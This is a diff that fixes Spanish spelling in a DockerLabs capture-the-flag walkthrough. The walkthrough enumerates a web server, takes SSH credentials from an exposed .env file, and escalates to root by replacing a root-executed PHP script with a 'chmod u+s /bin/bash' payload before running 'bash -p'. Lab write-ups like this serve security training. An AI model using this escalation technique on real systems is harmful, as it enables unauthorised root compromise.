@@ -2,7 +2,7 @@
 Estado: Completado
 Plataforma: DockerLabs
 SO: Linux
-Dificultad: Facil
+Dificultad: Fácil
 VectorInicial: Information Disclosure (.env exposed via JS)
 ServicioInicial: HTTP
 PuertoInicial: 80
@@ -36,7 +36,7 @@ Fecha: 2026-03-31
 ---
 <img width="918" height="524" alt="Pasted image 20260330160921" src="https://github.com/user-attachments/assets/f7a87ac1-8d22-4cf1-9b83-f9f4ba8dcefe" />
 
-Empezaremos con una enumeración de los puertos abiertos para ver contra que nos enfrentamos.
+Empezaremos con una enumeración de los puertos abiertos para ver contra qué nos enfrentamos.
 
 ```bash
  gomap -s $TARGET
@@ -66,9 +66,9 @@ Disponemos de dos puertos abiertos:
 
 Veamos que tenemos en el puerto `80`.
 
-As imple vista es una web para indicarnos las bondades de un gran perrito.
+A simple vista es una web para indicarnos las bondades de un gran perrito.
 
-Procedamos a una enumeración de ficheros y directorios a ver que vemos.
+Procedamos a una enumeración de ficheros y directorios a ver qué encontramos.
 
 ```bash
  gobuster dir -u http://$TARGET/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x html,php,txt,js
@@ -109,7 +109,7 @@ En el fichero `script.js` encontramos una anotación interesante.
     const header = document.querySelector('header');
 ```
 
-Así que como no podria ser de otra manera veamos que hay dentro del fichero `.env_de_baluchingon`.
+Así que, como no podía ser de otra manera, veamos qué hay dentro del fichero `.env_de_baluchingon`.
 
 ```txt
 RECOVERY LOGIN
@@ -117,7 +117,7 @@ RECOVERY LOGIN
 balu:balubalulerobalulei
 ```
 
-Con esto ya tenemos un acceso a la maquina para conectarnos por `ssh`.
+Con esto ya tenemos acceso a la máquina para conectarnos por `ssh`.
 
 ```bash
  ssh balu@$TARGET                                             
@@ -147,7 +147,7 @@ balu
 balu@6608f28c5023:~$ 
 ```
 
-Bien, ahora que tenemos acceso a la maquina vamos a proceder a ver si podemos escalar privilegios.
+Bien, ahora que tenemos acceso a la máquina, vamos a ver si podemos escalar privilegios.
 
 ```bash
 balu@6608f28c5023:~$ sudo -l
@@ -188,7 +188,7 @@ chocolate@2c290f93492c:/home$ sudo -l
 chocolate@2c290f93492c:/home$ 
 ```
 
-Después de probar un par de cosas vemos que o hay un resultado viable, además como no sabemos la contraseña de `chocolate` tampoco podemos usar el comando `sudo`.
+Después de probar un par de cosas vemos que no hay un resultado viable. Además, como no sabemos la contraseña de `chocolate`, tampoco podemos usar el comando `sudo`.
 
 Inspeccionemos los procesos que hay en ejecución a ver si `root` nos enseña algo.
 
@@ -206,7 +206,7 @@ chocolate@2c290f93492c:/home$ ls -la /opt/script.php
 -rw-r--r-- 1 chocolate chocolate 59 May  7  2024 /opt/script.php
 ```
 
-Aquí tenemos algo interesante, el usuario `root` tiene un proceso que se ejecuta cada 5 segundos y que llama al script `/opt/script.php`.
+Aquí tenemos algo interesante: el usuario `root` tiene un proceso que se ejecuta cada 5 segundos y que llama al script `/opt/script.php`.
 
 Según los permisos de este script podemos editarlo ya que somos el usuario `chocolate`.
 
@@ -216,7 +216,7 @@ Actualmente el fichero contiene solo un pequeño texto.
 <?php echo 'Script de pruebas en fase de beta testing'; ?>
 ```
 
-Pero al igual que se puede usar **PHP** para conseguir una *webshall* usaremos la ejecución de comandos para obtener acceso como `root`.
+Pero, al igual que se puede usar **PHP** para conseguir una *web shell*, usaremos la ejecución de comandos para obtener acceso como `root`.
 
 Para ese cometido cambiaremos el contenido del script.
 
@@ -226,7 +226,7 @@ chocolate@2c290f93492c:/home$ cat /opt/script.php
 <?php system('chmod u+s /bin/bash'); ?>
 ```
 
-Ahora unas vez pasados 5 segundos tendremos el **SUID** establecido en **/bin/bash** y lo podremos usar para acceder como `root`.
+Ahora, una vez pasados 5 segundos, tendremos el **SUID** establecido en **/bin/bash** y lo podremos usar para acceder como `root`.
 
 ```bash
 chocolate@2c290f93492c:/home$ find / -perm -4000 2>/dev/null 
@@ -248,10 +248,10 @@ root
 bash-5.0#
 ```
 
-Usando el comando `bash -p` le indicamos al sistema que nos facilite una *bash* pero con `provilegios`, de esta manera nos sirve un `bash` como `root`.
+Usando el comando `bash -p` le indicamos al sistema que nos facilite una *bash* pero con `privilegios`; de esta manera obtenemos una `bash` como `root`.
 
 Con esto finalizamos el laboratorio.
 
 Como podemos observar no siempre encontraremos los mismos métodos de acceso o de escalada.
 
-Este laboratorio nos enseña que desde los procesos en segundo plano podemos encontrar una vía para comprometer la maquina.
+Este laboratorio nos enseña que, a partir de procesos en segundo plano, podemos encontrar una vía para comprometer la máquina.
